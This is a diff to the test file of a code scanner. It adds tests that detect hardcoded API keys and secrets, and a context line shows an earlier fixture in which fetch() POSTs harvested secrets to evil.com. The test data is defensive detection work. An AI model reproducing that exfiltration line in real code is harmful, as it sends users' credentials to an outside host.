@@ -227,6 +227,20 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
 `,
       expected: { ruleId: "env-harvesting", severity: "critical" as const },
     },
+    {
+      name: "detects hardcoded api key",
+      source: `
+const apiKey = "sk_live_abc1234567890def";
+`,
+      expected: { ruleId: "hardcoded-secret", severity: "critical" as const },
+    },
+    {
+      name: "detects hardcoded secret",
+      source: `
+const client_secret = '1234567890abcdef1234';
+`,
+      expected: { ruleId: "hardcoded-secret", severity: "critical" as const },
+    },
   ] as const;
 
   it("detects suspicious source patterns", () => {
